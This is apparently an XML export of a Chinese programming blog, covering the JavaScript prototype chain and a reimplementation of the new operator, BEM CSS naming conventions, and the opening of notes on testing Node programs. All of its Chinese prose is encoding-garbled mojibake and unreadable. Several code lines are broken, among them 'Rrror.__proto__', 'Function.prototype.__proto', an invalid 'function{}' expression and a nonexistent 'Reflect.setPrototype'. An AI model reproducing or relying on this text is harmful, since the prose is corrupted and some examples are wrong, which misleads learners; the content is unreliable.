åŽŸåž‹çš„åŽŸåž‹åŽŸåž‹æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ—¢ç„¶æ˜¯å¯¹è±¡ï¼Œå°±å¯ä»¥ç”¨æœ€åŽŸå§‹çš„æ–¹å¼åˆ›å»ºå®ƒï¼Œé‚£å°±æ˜¯ï¼š 123var obj = new Object();obj.name = 'K';obj.name // K å…¶å®žåŽŸåž‹å¯¹è±¡å°±æ˜¯é€šè¿‡ Object æž„é€ å‡½æ•°ç”Ÿæˆçš„ï¼Œç»“åˆä¹‹å‰çš„ï¼Œå®žä¾‹çš„ __proto__ æŒ‡å‘å‡½æ•°çš„ prototype,æ›´æ–°ä¸€ä¸‹å…³ç³»å›¾ åŽŸåž‹é“¾é‚£ Object.prototype çš„åŽŸåž‹å‘¢ï¼Ÿ null,å¯ä»¥é€šè¿‡æ‰“å°éªŒè¯ï¼š 1Object.prototype.__proto__ === null // true ç„¶åŽ null ç©¶ç«Ÿä»£è¡¨äº†ä»€ä¹ˆï¼Ÿ null ä»£è¡¨æ²¡æœ‰å¯¹è±¡ï¼Œå³è¯¥å¤„ä¸åº”è¯¥æœ‰å€¼ã€‚ æ‰€ä»¥ Object.prototype.__proto__ çš„å€¼ä¸º null è·Ÿ Object.prototype æ²¡æœ‰åŽŸåž‹å…¶å®žè¡¨è¾¾äº†ä¸€ä¸ªæ„æ€ã€‚ æ‰€ä»¥æœ€åŽä¸€å¼ å…³ç³»å›¾å°±å¯ä»¥åœæ­¢æŸ¥æ‰¾äº†ã€‚ å›¾ä¸­ç›¸äº’å…³è”çš„åŽŸåž‹ç»„æˆçš„é“¾çŠ¶ç»“æž„å°±æ˜¯åŽŸåž‹é“¾ï¼Œä¹Ÿå°±æ˜¯è“è‰²è¿™æ¡çº¿ã€‚ è¡¥å……constructorconstructor æ˜¯éƒ¨ç½²åœ¨ Object.prototype ä¸Šçš„å±žæ€§ï¼Œä½äºŽåŽŸåž‹é“¾çš„æœ€é«˜ä¸€å±‚ï¼ˆå†é«˜ä¸€å±‚æ˜¯nullï¼‰ã€‚ä»»ä½•å¯¹è±¡ï¼ˆåŒ…æ‹¬å‡½æ•°ï¼Œéƒ½æœ‰ constructor å±žæ€§ï¼‰ï¼Œä»»ä½•ä¸€ä¸ª prototype å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª constructor å±žæ€§ï¼ŒæŒ‡å‘å®ƒçš„æž„é€ å‡½æ•°ã€‚æ¯ä¸€ä¸ªå®žä¾‹ä¹Ÿæœ‰ä¸€ä¸ª constructor å±žæ€§ï¼ˆåŽŸåž‹åŒ…å« constructor å±žæ€§ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡å¯¹è±¡çš„å®žä¾‹è®¿é—®ï¼‰ï¼Œé»˜è®¤è°ƒç”¨ prototype å¯¹è±¡çš„ constructor å±žæ€§ï¼Œå³ä¹ŸæŒ‡å‘å®ƒçš„æž„é€ å‡½æ•°ã€‚ 123function Person()&#123;&#125;var person = new Person();person.constructor === Person; // true å½“èŽ·å– person.constructor æ—¶ï¼Œå…¶å®ž person ä¸­å¹¶æ²¡æœ‰ constructor å±žæ€§ï¼Œå½“ä¸èƒ½è¯»å–åˆ° constructor å±žæ€§æ—¶ï¼Œä¼šä»Ž person çš„åŽŸåž‹ï¼Œä¹Ÿå°±æ˜¯ Person.prototype.constructor èŽ·å–ï¼Œæ­£å¥½åŽŸåž‹æœ‰è¯¥å±žæ€§ï¼Œæ‰€ä»¥ 1person.constructor === Person.prototype.constructor __proto__ç»å¤§éƒ¨åˆ†çš„æµè§ˆå™¨éƒ½æ”¯æŒè¿™ä¸ªéžæ ‡å‡†çš„æ–¹æ³•è®¿é—®åŽŸåž‹ï¼Œç„¶è€Œå®ƒå¹¶ä¸å­˜åœ¨äºŽ Person.prototype ä¸­ï¼Œå®žé™…ä¸Šï¼Œå®ƒæ˜¯æ¥è‡ª Object.prototype ï¼Œä¸Žå…¶è¯´æ˜¯ä¸€ä¸ªå±žæ€§ï¼Œä¸å¦‚è¯´æ˜¯ä¸€ä¸ª getter/setter ã€‚å½“ä½¿ç”¨ obj.__proto__ æ—¶ï¼Œå¯ä»¥ç†è§£ä¸ºè¿”å›žäº† Object.getPrototypeOf(obj)ã€‚ è¯¥å±žæ€§ä¹Ÿæ²¡æœ‰æ­£å¼å†™å…¥ ES6 çš„æ­£æ–‡ä¸­ï¼Œè€Œæ˜¯å†™å…¥äº†é™„å½•ã€‚åŽŸå› æ˜¯ __proto__å‰åŽçš„ä¸‹åˆ’çº¿ï¼Œè¯´æ˜Žå®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå†…éƒ¨å±žæ€§ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ­£å¼å¯¹å¤–çš„ APIã€‚åªæ˜¯ç”±äºŽæµè§ˆå™¨å¹¿æ³›æ”¯æŒæ‰åŠ å…¥äº† ES6 ã€‚æ ‡å‡†æ˜Žç¡®è§„å®šï¼Œåªæœ‰æµè§ˆå™¨å¿…é¡»éƒ¨ç½²è¿™ä¸ªå±žæ€§ï¼Œå…¶ä»–è¿è¡ŒçŽ¯å¢ƒä¸ä¸€å®šè¦éƒ¨ç½²ï¼Œè€Œä¸”æ–°çš„ä»£ç æœ€å¥½è®¤ä¸ºè¿™ä¸ªå±žæ€§æ˜¯ä¸å­˜åœ¨çš„ã€‚å› ä¸ºæ— ä»Žä»Žè¯­ä¹‰ä¸Šè¿˜æ˜¯ä»Žå…¼å®¹æ€§ä¸Šï¼Œéƒ½å°½é‡ä¸è¦ä½¿ç”¨è¿™ä¸ªå±žæ€§ã€‚è€Œæ˜¯ä½¿ç”¨ä¸‹é¢çš„ è¿™äº›æ–¹æ³•æ¥ä½œä»£æ›¿ï¼š Object.setPrototypeOf()ï¼šå†™æ“ä½œ Object.getPrototypeOf()ï¼šè¯»æ“ä½œ Object.create()ï¼šç”Ÿæˆæ“ä½œ å®žé™…ä¸Šï¼Œ__proto__ è°ƒç”¨çš„æ˜¯ Object.prototype.__proto__ï¼Œå…·ä½“çš„å®žçŽ°å¦‚ä¸‹. 123456789101112131415161718192021222324Object.defineProperty(Object.prototype,'__proto__',&#123; get()&#123; let _thisObj = Object(this); return Object.getPrototypeOf(_thisObj); &#125;, set(proto)&#123; if(this === undefined || this === null)&#123; throw new TypeError(); &#125; if(!isObject(this))&#123; return undefined; &#125; if(!isObject(proto))&#123; return undefined; &#125; let status = Reflect.setPrototype(this,proto); if(!status)&#123; throw new TypeError(); &#125; &#125;&#125;);function isObject(value)&#123; return Object(value) === value; &#125; çœŸçš„æ˜¯ç»§æ‰¿å—å‰é¢æåˆ°ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½ä¼šä»ŽåŽŸåž‹ â€œç»§æ‰¿â€ å±žæ€§ï¼Œå®žé™…ä¸Šï¼Œç»§æ‰¿æ˜¯ä¸€ä¸ªå…·æœ‰è¿·æƒ‘æ€§çš„è¯´æ³•ï¼Œç»§æ‰¿ä»¥ä¸ºæ˜¯å¤åˆ¶æ“ä½œï¼Œrç„¶è€Œ JavaScript é»˜è®¤å¹¶ä¸ä¼šå¤åˆ¶å¯¹è±¡çš„å±žæ€§ï¼Œç›¸åï¼ŒJavaScript åªæ˜¯åœ¨ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´åˆ›å»ºä¸€ä¸ªå…³è”ï¼Œè¿™æ ·ï¼Œä¸€ä¸ªå¯¹è±¡å¯ä»¥é€šè¿‡å§”æ‰˜è®¿é—®å¦ä¸€ä¸ªå¯¹è±¡çš„å±žæ€§å’Œå‡½æ•°ã€‚æ‰€ä»¥ä¸Žå…¶å«åšç»§æ‰¿ï¼Œå§”æ‰˜çš„è¯´æ³•åè€Œæ›´å‡†ç¡®ä¸€ç‚¹ã€‚ è¡¥å……å®Œæ•´å›¾Object æ˜¯ä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼Œä¹Ÿæ˜¯ Function æž„é€ çš„ï¼ŒObject.prototype æ˜¯ä¸€ä¸ªæ™®é€šå¯¹è±¡ã€‚Function.prototype æ˜¯ä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼Œä¹‹å‰è®¨è®ºçš„å‡½æ•°å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªæ˜¾ç¤ºçš„ prototype å±žæ€§ï¼Œä½†æ˜¯ Function.prototype å´æ²¡æœ‰ prototype å±žæ€§ï¼Œå°±æ˜¯ Function.prototype.prototype === undefined ï¼Œæ‰€æœ‰ Function.prototype å‡½æ•°å¯¹è±¡éƒ½æ˜¯ä¸€ä¸ªç‰¹ä¾‹ï¼Œæ²¡æœ‰ prototype å±žæ€§ã€‚ ç›¸å…³çš„å‡½æ•°instanceof åŽŸç†instanceof æ˜¯åˆ¤æ–­å®žä¾‹å¯¹è±¡çš„ __proto__ å’Œç”Ÿæˆè¯¥å®žä¾‹çš„ prototype ï¼ˆä¹Ÿæ˜¯å®žä¾‹å¯¹è±¡å’ŒåŽŸåž‹å¯¹è±¡ä¹‹é—´ï¼‰æ˜¯ä¸æ˜¯å¼•ç”¨çš„åŒä¸€ä¸ªåœ°å€ï¼Œæ˜¯çš„ä¼šå°±è¿”å›ž true,ä¸æ˜¯å°±è¿”å›ž falseã€‚ new è¿ç®—ç¬¦new è¿ç®—ç¬¦çš„åŽŸç† ä¸€ä¸ªæ–°å¯¹è±¡è¢«åˆ›å»ºï¼Œå®ƒç»§æ‰¿è‡ª foo.Prototype æž„é€ å‡½æ•°è¿”å›žä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œç›¸åº”çš„å‚æ•°ä¼šè¢«ä¼ å…¥ï¼ŒåŒæ—¶ä¸Šä¸‹æ–‡ï¼ˆthisï¼‰ä¼šè¢«æŒ‡å®šä¸ºè¿™ä¸ªæ–°çš„å®žä¾‹ new foo ç­‰åŒäºŽ new Foo(),åªèƒ½ç”¨åœ¨ä¸ä¼ é€’ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹ å¦‚æžœæž„é€ å‡½æ•°è¿”å›žäº†ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡ä¼šå–ä»£æ•´ä¸ª new å‡ºæ¥çš„ç»“æžœã€‚å¦‚æžœæž„é€ å‡½æ•°æ²¡æœ‰è¿”å›žå¯¹è±¡ï¼Œé‚£è¿™ä¸ª new å‡ºæ¥çš„ç»“æžœåˆ™ä¸ºæ­¥éª¤1åˆ›å»ºçš„å¯¹è±¡ã€‚ 12345var myNew = function(func)&#123; var o = Object.create(func.prototype); // åˆ›å»ºå¯¹è±¡ var k = func.call(o); // æ”¹å˜ this çš„æŒ‡å‘ï¼ŒæŠŠç»“æžœç»™ k return (typeof k === 'object' ? k : o); // åˆ¤æ–­ k çš„ç±»åž‹æ˜¯ä¸æ˜¯å¯¹è±¡ï¼Œå¦‚æžœæ˜¯å°±è¿”å›ž kï¼Œä¸æ˜¯åˆ™è¿”å›žåŽŸæ¥çš„å¯¹è±¡ o&#125; é€šè¿‡ç®€å•çš„æ£€éªŒï¼Œå¯ä»¥çŸ¥é“ä¸Šé¢è¿™ä¸ª myNew å‡½æ•°è·Ÿ new è¿ç®—ç¬¦çš„ä½œç”¨æ˜¯ä¸€æ ·çš„ã€‚ isPrototypeOf()è¿™ä¸ªæ–¹æ³•ï¼Œç”¨æ¥åˆ¤æ–­æŸä¸ª prototypeå¯¹è±¡å’Œå®žä¾‹ä¹‹é—´çš„å…³ç³»ã€‚ hasOwnProperty()æ¯ä¸ªå®žä¾‹å¯¹è±¡éƒ½ä¸€ä¸ª hasOwnPerperty()æ–¹æ³•ï¼Œç”¨æ¥åˆ¤æ–­æŸä¸€ä¸ªå±žæ€§æ˜¯æœ¬åœ°çš„ï¼Œè¿˜æ˜¯ç»§æ‰¿è‡ª prototypeå¯¹è±¡çš„å±žæ€§ã€‚ in æ“ä½œç¬¦in æ“ä½œç¬¦å¯ä»¥ç”¨æ¥åˆ¤æ–­ï¼ŒæŸä¸ªå®žä¾‹æ˜¯å¦æœ‰æŸä¸ªå±žæ€§ï¼Œä¸ç®¡æ˜¯ä¸æ˜¯æœ¬åœ°å±žæ€§ã€‚ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨éåŽ†ä¸­ï¼Œä¸å»ºè®®ä½¿ç”¨å®ƒçš„åŽŸç†ï¼Œå¯èƒ½ä¼šéåŽ†åˆ°é¢„æƒ³ä¸åˆ°çš„ç»“æžœï¼Œå¦‚æžœçœŸçš„è¦ä½¿ç”¨çš„è¯ï¼Œå»ºè®®ç»“åˆ hasOwnProperty()å‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦ä¸ºæœ¬åœ°çš„å±žæ€§å†ä½œæ“ä½œã€‚ prototype å’Œ __proto__æ‰€æœ‰æž„é€ å™¨/å‡½æ•°ï¼ˆä¹Ÿæ˜¯å¯¹è±¡ï¼‰çš„ __proto__éƒ½æŒ‡å‘ Function.prototype,å®ƒæ˜¯ä¸€ä¸ªç©ºå‡½æ•°ï¼ˆEmpty functionï¼‰ 123456789101112131415Number.__proto__ === Function.prototype;Boolean.__proto__ === Function.prototype;String.__proto__ === Function.prototype;Object.__proto__ === Function.prototype;Function.__proto__ === Function.prototype;Array.__proto__ === Function.prototype;RegExp.__proto__ === Function.prototype;Rrror.__proto__ === Function.prototype;Date.__proto__ === Function.prototype;// è‡ªå®šä¹‰çš„function Person()&#123;&#125;const Man = function&#123;&#125;Person.__proto__ === Function.prototype;Man.__proto__ === Function.prototype; JavaScript ä¸­æœ‰å†…ç½®ï¼ˆbuild-inï¼‰æž„é€ å™¨/å¯¹è±¡å…±è®¡12ä¸ªï¼ˆES5åŠ å…¥äº†JSONï¼‰ï¼Œå‰©ä¸‹çš„å¦‚ global ä¸èƒ½ç›´æŽ¥è®¿é—®ï¼ŒArguments ä»…åœ¨å‡½æ•°è°ƒç”¨æ—¶ç”± JS å¼•æ“Žåˆ›å»ºï¼ŒMath,JSON æ˜¯ä»¥å¯¹è±¡å½¢å¼å­˜åœ¨çš„ï¼Œæ— éœ€ new .å®ƒä»¬çš„åŽŸåž‹æŒ‡å‘æ˜¯ Object.prototype 12Math.__proto__ === Object.prototype;JSON.__proto__ === Object.prototype; å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæž„é€ å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå¯ä»¥ç†è§£ä¸ºï¼šæž„é€ å‡½æ•°æ˜¯ç”± Function æž„é€ å‡½æ•° å®žä¾‹åŒ–å‡ºæ¥çš„å‡½æ•°å¯¹è±¡ã€‚ æ‰€æœ‰çš„æž„é€ å™¨éƒ½æ¥è‡ªäºŽ Function.prototype,ç”šè‡³åŒ…æ‹¬è·Ÿæž„é€ å™¨ Object åŠ Function æœ¬èº«ï¼Œæ‰€æœ‰çš„æž„é€ å™¨éƒ½ç»§æ‰¿äº† Function.prototype çš„å±žæ€§åŠæ–¹æ³•ã€‚å¦‚ lengthï¼Œcall,apply,bindã€‚ é‚£ä¹ˆ Function.prototype çš„åŽŸåž‹æŒ‡å‘ä»€ä¹ˆå‘¢? 1Function.prototype.__proto === Object.prototype; è¿™è¯´æ˜Žäº†æ‰€æœ‰çš„æž„é€ å™¨ä¹Ÿéƒ½æ˜¯ä¸€ä¸ªæ™®é€šçš„å‡½æ•°ï¼Œå¯ä»¥ç»™æž„é€ å™¨æ·»åŠ /åˆ é™¤å±žæ€§ç­‰ã€‚åŒæ—¶å®ƒä¹Ÿç»§æ‰¿äº† Object.prototype ä¸Šçš„æ‰€æœ‰çš„æ–¹æ³•ï¼štoStringï¼ŒvalueOf,hasOwnProperty ç­‰ã€‚ æœ€åŽ 1Object.prototype.__proto__ === null å·²ç»åˆ°é¡¶äº†ï¼Œå®žä¾‹æ˜¯æ²¡æœ‰ prototype å±žæ€§çš„ï¼Œprototype åªæœ‰å‡½æ•°æ‰æœ‰çš„ï¼Œè·ŸåŽŸåž‹é“¾æ²¡æœ‰å…³ç³»ã€‚ protytypeJavaScript è§„å®šï¼Œæ¯ä¸€ä¸ªæž„é€ å‡½æ•°éƒ½æœ‰ä¸€ä¸ª prototype å±žæ€§ï¼ŒæŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±žæ€§å’Œæ–¹æ³•ï¼Œéƒ½ä¼šè¢«æž„é€ å‡½æ•°çš„å®žä¾‹ç»§æ‰¿ã€‚è¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸å˜çš„å±žæ€§å’Œæ–¹æ³•ï¼Œç›´æŽ¥å®šä¹‰åˆ° prototype å¯¹è±¡ä¸Šã€‚è¿™ä¸ªå±žæ€§åŒ…å«ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€æœ‰çš„å®žä¾‹å¯¹è±¡éœ€è¦å…±äº«çš„å±žæ€§å’Œæ–¹æ³•ï¼Œéƒ½æ”¾åœ¨è¿™ä¸ªå¯¹è±¡é‡Œé¢ï¼Œé‚£ä¹ˆä¸éœ€è¦å…±äº«çš„å±žæ€§å’Œæ–¹æ³•ï¼Œå°±æ”¾åœ¨æž„é€ å‡½æ•°é‡Œé¢ã€‚å®žä¾‹å¯¹è±¡ä¸€æ—¦è¢«åˆ›å»ºï¼Œå°†è‡ªåŠ¨å¼•ç”¨ prototype å¯¹è±¡çš„å±žæ€§å’Œæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®žä¾‹å¯¹è±¡çš„å±žæ€§å’Œæ–¹æ³•ï¼Œåˆ†æˆä¸¤ç§ï¼Œä¸€ç§æ˜¯æœ¬åœ°çš„ï¼Œå¦ä¸€ç§æ˜¯å¼•ç”¨ protytype å¯¹è±¡çš„ã€‚ apply,call,bindæ¯ä¸ªå‡½æ•°éƒ½åŒ…å«ä¸¤ä¸ªéžç»§æ‰¿è€Œæ¥çš„æ–¹æ³•ï¼šcall() å’Œ apply()ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°è®¾ç½®å‡½æ•°ä½“å†… this å¯¹è±¡çš„å€¼ã€‚call å’Œ apply æ˜¯ Function çš„æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ this ,ç¬¬äºŒä¸ªå‚æ•°æ˜¯ Function å‚æ•°ã€‚æ¯”å¦‚è¯´å‡½æ•°é‡Œå†™äº† thisï¼Œæ™®é€šè°ƒç”¨è¿™ä¸ªthis å¯èƒ½æ˜¯ window ,è€Œä½¿ç”¨äº†call æˆ–è€…æ˜¯ apply ã€‚ç¬¬ä¸€ä¸ªå‚æ•°å†™çš„æ˜¯ä»€ä¹ˆï¼Œé‡Œé¢çš„this å°±æ˜¯ä»€ä¹ˆï¼ˆå³æ”¹å˜ this çš„æŒ‡å‘ï¼‰ã€‚ call å’Œ apply éƒ½æ˜¯ä¸ºäº†æ”¹å˜æŸä¸ªå‡½æ•°çš„è¿è¡Œçš„ context å³ä¸Šä¸‹æ–‡è€Œå­˜åœ¨çš„ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯ä¸ºäº†é«˜è¾¹ å‡½æ•°ä½“å†…çš„ this æŒ‡å‘ã€‚æ™®é€šå‡½æ•°è°ƒç”¨æ˜¯éšå¼çš„ä¼ å…¥ this,call å’Œ apply å¯ä»¥æ˜¾å¼åœ°æŒ‡å®šå®ƒã€‚call å’Œ apply çœŸæ­£å¼ºå¤§çš„åœ°æ–¹åœ¨äºŽå®ƒä»¬èƒ½å¤Ÿæ‰©å……å‡½æ•°èµ–ä»¥è¿è¡Œçš„ä½œç”¨åŸŸï¼Œè€Œä¸”å¥½å¤„åœ¨äºŽå¯¹è±¡ä¸éœ€è¦ä¸Žæ–¹æ³•æœ‰ä»»ä½•è€¦åˆå…³ç³»ã€‚ å‚è€ƒé“¾æŽ¥ï¼šJavaScript æž„é€ å‡½æ•° prototypeå±žæ€§å’Œprotoå’ŒåŽŸåž‹é“¾ constructorå±žæ€§ apply(),call()å’Œbind() å…³é”®å­—this newæ“ä½œç¬¦]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>æ·±å…¥JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BEM è§„èŒƒ]]></title>
    <url>%2F2019-1-09-BEM.html</url>
    <content type="text"><![CDATA[Blockï¼ŒElement å’Œ Modifiersç®€ä»‹ BEM å«ä¹‰ ä¾‹å­ Block ç‹¬ç«‹å®žä½“ï¼Œå®ƒæœ¬èº«å°±æ˜¯æœ‰æ„ä¹‰çš„ header,container,menu,checkbox,input Element å—çš„ä¸€éƒ¨åˆ†ï¼Œæ²¡æœ‰ç‹¬ç«‹å«ä¹‰ï¼Œå¹¶ä¸”åœ¨è¯­ä¹‰ä¸Šä¸Žå…¶å—ç›¸å…³è” menu item,list item,checkbox caption,header title Modifiers å—æˆ–å…ƒç´ ä¸Šçš„æ ‡å¿—ã€‚ä½¿ç”¨å®ƒä»¬æ¥æ”¹å˜å¤–è§‚æˆ–è¡Œä¸º disabled,highlighted,checked,fixed,size big,color yellow ä¼˜ç‚¹ï¼š æ¨¡å—åŒ–ï¼šå—æ ·å¼æ°¸è¿œä¸ä¼šä¾èµ–é¡µé¢ä¸Šçš„å…¶ä»–å…ƒç´ ï¼Œä¸ä¼šé‡åˆ°çº§è”é—®é¢˜ å¯é‡ç”¨æ€§ï¼šä»¥ä¸åŒæ–¹å¼ç»„åˆå—ï¼Œå¹¶æ™ºèƒ½é‡ç”¨å®ƒä»¬ï¼Œå‡å°‘äº†å¿…é¡»ç»´æŠ¤çš„ CSS ä»£ç é‡ ç»“æž„ä½“ï¼šBEMæ–¹æ³•ä¸ºCSS ä»£ç æä¾›äº†ä¸€ä¸ªç®€å•æ˜“æ‡‚çš„ç»“æž„ ç”¨æ³•ä»¥åŠç‰¹ç‚¹Blockå°è£…ä¸€ä¸ªç‹¬ç«‹çš„å®žä½“ï¼Œæœ¬çœæ˜¯æœ‰æ„ä¹‰çš„ï¼Œè™½ç„¶å—ç›¸äº’åµŒå¥—å¹¶ç›¸äº’äº¤äº’ï¼Œä½†åœ¨è¯­ä¹‰ä¸Šå®ƒä»¬ä¿æŒç›¸ç­‰ï¼Œæ²¡æœ‰ä¼˜å…ˆæƒæˆ–ç­‰çº§åˆ¶åº¦ã€‚æ²¡æœ‰ DOM è¡¨ç¤ºçš„æ•´ä½“å®žä½“ï¼ˆä¾‹å¦‚æŽ§åˆ¶å™¨æˆ–è€…æ¨¡åž‹ï¼‰ä¹Ÿå¯ä»¥æ˜¯å—ã€‚ å‘½å å—çš„åç§°å¯ä»¥åŒ…å« æ‹‰ä¸å­—æ¯ï¼Œæ•°å­—å’ŒçŸ­åˆ’çº¿ã€‚è¦å½¢æˆ CSS ç±»ï¼Œè¦ä¸º namespacing æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å‰ç¼€ï¼šblockã€‚ HTML å¦‚æžœæŽ¥å—ç±»åï¼Œåˆ™ä»»ä½• DOM èŠ‚ç‚¹éƒ½å¯ä»¥æ˜¯å—ã€‚ 1&lt;div class="block"&gt;...&lt;/div&gt; CSS ä»…ä½¿ç”¨ç±»åé€‰æ‹©å™¨ æ²¡æœ‰æ ‡ç­¾åç§°æˆ– ID ä¸ä¾èµ–é¡µé¢ä¸Šçš„å…¶ä»–å—/å…ƒç´  1.block&#123; color: #ff9; &#125; Elementå—çš„ä¸€éƒ¨åˆ†å¹¶æ²¡æœ‰ç‹¬ç«‹çš„å«ä¹‰ï¼Œä»»ä½•å…ƒç´ åœ¨è¯­ä¹‰ä¸Šä¸Žå…¶å—ç›¸å…³è” å‘½å å…ƒç´ çš„åç§°å¯ä»¥åŒ…å«æ‹‰ä¸å­—æ¯ï¼Œæ•°å­—ï¼ŒçŸ­åˆ’çº¿å’Œä¸‹åˆ’çº¿ã€‚CSS ç±»å½¢æˆå—åç§°åŠ ä¸Šä¸¤ä¸ªä¸‹åˆ’çº¿åŠ ä¸Šå…ƒç´ åç§°ï¼š.block__elem HTML å—ä¸­æ›´å¤šä»»ä½• DOM èŠ‚ç‚¹éƒ½å¯ä»¥æ˜¯å…ƒç´ ï¼Œåœ¨ç»™å®šå—å†…ï¼Œæ‰€æœ‰å…ƒç´ åœ¨è¯­ä¹‰ä¸Šéƒ½æ˜¯ç›¸ç­‰çš„ã€‚ 123&lt;div class="block"&gt; &lt;span class="block__elem"&gt;&lt;/span&gt;&lt;/div&gt; CSS ä»…ä½¿ç”¨ç±»åç§°é€‰æ‹©å™¨ æ²¡æœ‰æ ‡ç­¾åç§°æˆ–ID ä¸ä¾èµ–é¡µé¢ä¸Šçš„å…¶ä»–å—/å…ƒç´  12345/* å¥½ */.block__elem &#123; color: #ff9 &#125;/* å */.block .block__elem &#123; color: #ff9 &#125; div.block__elem &#123; color: #ff9 &#125; Modifierå—æˆ–å…ƒç´ ä¸Šçš„æ ‡å¿—ï¼Œä½¿ç”¨å®ƒä»¬æ¥æ”¹å˜å¤–è§‚ï¼Œè¡Œä¸ºæˆ–çŠ¶æ€ å‘½å ä¿®é¥°ç¬¦åç§°å¯ä»¥åŒ…å«æ‹‰ä¸å­—æ¯ï¼Œæ•°å­—ï¼Œæ®µåˆ’çº¿æˆ–ä¸‹åˆ’çº¿ï¼ŒCSSç±»å½¢æˆå—çš„æˆ–å…ƒç´ çš„åç§°æœºä¸Šä¸¤ä¸ªç ´æŠ˜å·ï¼šblock--modæˆ–æ˜¯ block__elem--mod å’Œ block--color--blackä¸Ž .block--color--red .å¤æ‚ä¿®æ”¹å™¨ä¸­çš„ç©ºæ ¼ç”±çŸ­åˆ’çº¿æ›¿æ¢ã€‚ HTML ä¿®é¥°ç¬¦æ˜¯æ·»åŠ åˆ°å—/å…ƒç´  DOM èŠ‚ç‚¹çš„é¢å¤–ç±»åã€‚ä»…å°†ä¿®é¥°ç¬¦ç±»æ·»åŠ åˆ°å®ƒä»¬ä¿®æ”¹çš„å—/å…ƒç´ ï¼Œå¹¶ä¿ç•™åŽŸç±»ã€‚ 12345678&lt;!--å¥½--&gt;&lt;div class = "block block--mod"&gt; &lt;div class="block block--size--big block-shadow--yes"&gt;&lt;/div&gt;&lt;/div&gt;&lt;!--å--&gt;&lt;div class="block--mod"&gt; ...&lt;/div&gt; CSS ä½¿ç”¨ä¿®é¥°ç¬¦ç±»åä½œä¸ºé€‰æ‹©å™¨ï¼š 1.block--hidden &#123; &#125; è¦åŸºäºŽå—ä¿®é¥°ç¬¦æ›´æ”¹å…ƒç´ : 1.block--mod .block__elem &#123; &#125; å…ƒç´ ä¿®é¥°ï¼š 1.block__elem--mod &#123; &#125; å…¶ä»–é—®é¢˜æœ‰æ—¶å€™å¯èƒ½æœ‰åµŒå¥—å—çš„æƒ…å†µï¼Œç¿»äº†å¾ˆå¤šæ–‡ç« ï¼Œå¤§æ¦‚æœ‰å‡ ä¸ªä¾‹å­: .block-block__element--modifier .block-block--modifier__element--modifier]]></content>
      <categories>
        <category>BEM</category>
      </categories>
      <tags>
        <tag>Bem</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” æµ‹è¯• Node ç¨‹åº]]></title>
    <url>%2F2019-1-07-NodeJs2-Part9.html</url>
    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ æµ‹è¯• Node ç¨‹åºæœ¬ç« å†…å®¹ ç”¨ Node çš„ assert æ¨¡å—æµ‹è¯• ä½¿ç”¨å…¶ä»–æ–­è¨€åº“ ä½¿ç”¨ Node å•å…ƒæµ‹è¯•æ¡†æž¶ ç”¨ Node æ¨¡æ‹Ÿå¹¶æŽ§åˆ¶ Web æµè§ˆå™¨ åœ¨æµ‹è¯•å¤±è´¥æ—¶èŽ·å–æ›´å¤šçš„ä¿¡æ¯ æ·»åŠ åˆ° ç¨‹åºä¸­çš„åŠŸèƒ½è¶Šæ¥è¶Šå¤šï¼Œå‡ºçŽ°çš„ bug çš„é£Žé™©å°±è¶Šé«˜ã€‚æ²¡ç»è¿‡æµ‹è¯•çš„ç¨‹åºæ˜¯ä¸å®Œæ•´çš„ï¼Œè€Œæ‰‹åŠ¨æµ‹è¯•æ—¢ç¹çåˆå®¹æ˜“å‡ºé”™ï¼Œæ‰€ä»¥è‡ªåŠ¨æµ‹è¯•è¶Šæ¥è¶Šå—æ¬¢è¿Žã€‚è‡ªåŠ¨æµ‹è¯•æŒ‡çš„æ˜¯ç¼–å†™ä»£ç æ¥æµ‹è¯•ä»£ç ï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨è¿è¡Œç¨‹åºä¸­çš„åŠŸèƒ½ã€‚ ä¸¤ç§åŸºæœ¬æµ‹è¯•ï¼šå•å…ƒæµ‹è¯•å’ŒéªŒæ”¶æµ‹è¯•ã€‚å•å…ƒæµ‹è¯•ç›´æŽ¥æµ‹è¯•ä»£ç é€»è¾‘ï¼Œé€šå¸¸æ˜¯åœ¨å‡½æ•°æˆ–æ–¹æ³•å±‚é¢ï¼Œé€‚ç”¨äºŽæ‰€æœ‰ç±»åž‹çš„ç¨‹åºã€‚å•å…ƒæµ‹è¯•å¯ä»¥åˆ†æˆä¸¤ç§å½¢æ€ï¼šæµ‹è¯•é©±åŠ¨å¼€å‘ï¼ˆTDDï¼‰ 